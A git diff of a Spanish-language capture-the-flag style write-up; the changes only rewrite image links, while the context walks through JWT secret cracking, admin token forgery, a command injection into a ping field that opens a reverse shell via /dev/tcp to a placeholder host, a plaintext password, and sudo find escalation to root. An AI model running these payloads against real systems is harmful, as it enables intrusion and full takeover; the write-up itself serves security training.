@@ -6,7 +6,7 @@
 
 Realizamos un escaneo de puertos inicial con nmap para identificar los servicios activos:
 
-![Pasted image 20260624174525.png](<../../../.gitbook/assets/Pasted image 20260624174525.png>)
+![[Pasted image 20260624174525.png]]
 
 **Servicios identificados:**
 
@@ -21,9 +21,9 @@ Realizamos un escaneo de puertos inicial con nmap para identificar los servicios
 
 Analizamos las tecnologías web mediante whatweb y los directorios mediante gobuster:
 
-![Pasted image 20260624174625.png](<../../../.gitbook/assets/Pasted image 20260624174625.png>)
+![[Pasted image 20260624174625.png]]
 
-![Pasted image 20260624174701.png](<../../../.gitbook/assets/Pasted image 20260624174701.png>)
+![[Pasted image 20260624174701.png]]
 
 * **Hallazgo:** Identificamos rutas como `/dashboard` y `/admin`. Sin embargo, al intentar ingresar, redirigen directamente a `index.php`.
 
@@ -31,11 +31,11 @@ Analizamos las tecnologías web mediante whatweb y los directorios mediante gobu
 
 Accedemos a `index.php` donde nos encontramos con un formulario de inicio de sesión:
 
-![Pasted image 20260624174752.png](<../../../.gitbook/assets/Pasted image 20260624174752.png>)
+![[Pasted image 20260624174752.png]]
 
 Tras probar credenciales genéricas (admin:admin, root:root) sin éxito, procedemos a inspeccionar el código fuente del sitio:
 
-![Pasted image 20260624174834.png](<../../../.gitbook/assets/Pasted image 20260624174834.png>)
+![[Pasted image 20260624174834.png]]
 
 * **Hallazgo:** Localizamos credenciales hardcodeadas correspondientes a un usuario invitado: `guest:guest`.
 
@@ -43,11 +43,11 @@ Tras probar credenciales genéricas (admin:admin, root:root) sin éxito, procede
 
 Iniciamos sesión con las credenciales `guest:guest`:
 
-![Pasted image 20260624174904.png](<../../../.gitbook/assets/Pasted image 20260624174904.png>)
+![[Pasted image 20260624174904.png]]
 
 Ingresamos al panel de control, pero no contamos con acceso al panel de administrador. Observamos que la sesión utiliza un token JWT (JSON Web Token) almacenado en el cliente. Procedemos a inspeccionar la estructura del token:
 
-![Pasted image 20260624175005.png](<../../../.gitbook/assets/Pasted image 20260624175005.png>)
+![[Pasted image 20260624175005.png]]
 
 * **Análisis del Token:** El token JWT utiliza el algoritmo de firma HS256 (criptografía simétrica, lo que significa que la clave secreta se usa tanto para firmar como para verificar el token).
 
@@ -61,24 +61,24 @@ Utilizamos la herramienta de crackeo de firmas JWT (jwt-cracker) para intentar o
 
 Enlace a la herramienta: https://github.com/lmammino/jwt-cracker
 
-![Pasted image 20260624175110.png](<../../../.gitbook/assets/Pasted image 20260624175110.png>)
+![[Pasted image 20260624175110.png]]
 
 * **Resultado:** La herramienta determina que el secreto del JWT es `batman`.
 * **Modificación del Token:** Con la clave secreta expuesta, alteramos los campos del payload de nuestro JWT para cambiar el rol o usuario a "admin" y volvemos a firmar el token utilizando el secreto `batman`:
 
-![Pasted image 20260624175241.png](<../../../.gitbook/assets/Pasted image 20260624175241.png>)
+![[Pasted image 20260624175241.png]]
 
-![Pasted image 20260624175424.png](<../../../.gitbook/assets/Pasted image 20260624175424.png>)
+![[Pasted image 20260624175424.png]]
 
 #### Comando de Inyección (RCE)
 
 Con el nuevo token firmado como administrador, logramos acceder al panel del NOC (Network Operations Center):
 
-![Pasted image 20260624175448.png](<../../../.gitbook/assets/Pasted image 20260624175448.png>)
+![[Pasted image 20260624175448.png]]
 
 Este panel cuenta con una utilidad de ping. Evaluamos si el input permite concatenación o inyección de comandos:
 
-![Pasted image 20260624175510.png](<../../../.gitbook/assets/Pasted image 20260624175510.png>)
+![[Pasted image 20260624175510.png]]
 
 El input no está sanitizado, lo que nos permite inyectar comandos del sistema. Solicitamos una shell inversa a nuestra máquina atacante:
 
@@ -86,7 +86,7 @@ El input no está sanitizado, lo que nos permite inyectar comandos del sistema. 
 127.0.0.1; bash -c 'bash -i >& /dev/tcp/IP/PUERTO 0>&1'
 ```
 
-![Pasted image 20260624175607.png](<../../../.gitbook/assets/Pasted image 20260624175607.png>)
+![[Pasted image 20260624175607.png]]
 
 Establecemos con éxito la shell inversa como el usuario `www-data`.
 
@@ -94,7 +94,7 @@ Establecemos con éxito la shell inversa como el usuario `www-data`.
 
 Enumerando el sistema de archivos, localizamos un archivo de configuración que expone credenciales en texto claro:
 
-![Pasted image 20260624175652.png](<../../../.gitbook/assets/Pasted image 20260624175652.png>)
+![[Pasted image 20260624175652.png]]
 
 Verificando el archivo `/etc/passwd`, corroboramos la existencia del usuario `bruce` en la máquina. Usamos el comando `su` para cambiar de usuario utilizando la contraseña descubierta (`Arkh4m_Kn1ght!`):
 
@@ -102,7 +102,7 @@ Verificando el archivo `/etc/passwd`, corroboramos la existencia del usuario `br
 su bruce
 ```
 
-![Pasted image 20260624175751.png](<../../../.gitbook/assets/Pasted image 20260624175751.png>)
+![[Pasted image 20260624175751.png]]
 
 Obtenemos una sesión como el usuario `bruce`.
 
@@ -114,7 +114,7 @@ Obtenemos una sesión como el usuario `bruce`.
 
 Verificamos los privilegios del comando sudo de los que dispone el usuario `bruce`:
 
-![Pasted image 20260624175834.png](<../../../.gitbook/assets/Pasted image 20260624175834.png>)
+![[Pasted image 20260624175834.png]]
 
 * **Vulnerabilidad de Configuración:** El usuario `bruce` puede ejecutar el comando `find` (/usr/bin/find) como `root` sin necesidad de ingresar contraseña. Ver teoría en [Permissions.md](<../../../Pentesting Notes/3_Post-Explotation/Linux Privilage Escalation/Permissions.md>).
 
@@ -126,7 +126,7 @@ Aprovechamos la capacidad de ejecución de comandos integrados en `find` para so
 sudo /usr/bin/find . -exec /bin/bash -p \; -quit
 ```
 
-![Pasted image 20260624175904.png](<../../../.gitbook/assets/Pasted image 20260624175904.png>)
+![[Pasted image 20260624175904.png]]
 
 ¡Elevamos privilegios con éxito obteniendo control total de la máquina objetivo!
 
